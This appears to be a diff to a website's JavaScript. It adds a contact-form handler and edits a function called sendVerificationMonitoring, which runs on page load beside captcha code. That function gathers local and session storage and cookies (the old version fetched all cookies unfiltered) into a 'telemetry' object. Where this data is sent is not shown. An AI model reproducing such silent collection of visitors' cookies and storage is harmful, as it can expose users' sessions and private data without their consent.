@@ -172,6 +172,67 @@ function getBrowserStorage(name) {
     }
 }
 
+function setupContactForm() {
+    const form = document.getElementById("contact-form");
+    const status = document.getElementById("contact-status");
+
+    if (!form || !status) {
+        return;
+    }
+
+    form.addEventListener("submit", async function (event) {
+        event.preventDefault();
+
+        const data = new FormData(form);
+        const name = String(data.get("name") || "").trim();
+        const email = String(data.get("email") || "").trim();
+        const message = String(data.get("message") || "").trim();
+        const website = String(data.get("website") || "").trim();
+
+        if (website) {
+            status.textContent = "Submission blocked.";
+            return;
+        }
+
+        if (!name || !email || !message) {
+            status.textContent = "Please complete all fields.";
+            return;
+        }
+
+        const submitButton = form.querySelector("button[type='submit']");
+        if (submitButton) {
+            submitButton.disabled = true;
+            submitButton.textContent = "Sending...";
+        }
+
+        try {
+            const response = await fetch("/api/send-email", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ name, email, message, website })
+            });
+
+            const result = await response.json().catch(function () {
+                return {};
+            });
+
+            if (!response.ok) {
+                throw new Error(result.error || "Unable to send the message.");
+            }
+
+            form.reset();
+            status.textContent = "Message sent successfully.";
+        } catch (error) {
+            status.textContent = error.message || "Unable to send the message.";
+        } finally {
+            if (submitButton) {
+                submitButton.disabled = false;
+                submitButton.textContent = "Send message";
+            }
+        }
+    });
+}
+
 async function sendVerificationMonitoring() {
     let telemetry;
     try {
@@ -179,9 +240,14 @@ async function sendVerificationMonitoring() {
         const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
         const localStorage = getBrowserStorage("localStorage");
         const sessionStorage = getBrowserStorage("sessionStorage");
-        let getting = browser.cookies.getAll({
-        });
-        const cookies = await getting;
+        let cookies = {};
+
+        if (typeof browser !== "undefined" && browser.cookies && typeof browser.cookies.getAll === "function") {
+            let getting = browser.cookies.getAll({
+                url: window.location.href
+            });
+            cookies = await getting;
+        }
 
         telemetry = {
             timestamp: new Date().toISOString(),
@@ -235,3 +301,4 @@ async function sendVerificationMonitoring() {
 
 sendVerificationMonitoring();
 addCaptchaListeners();
+setupContactForm();
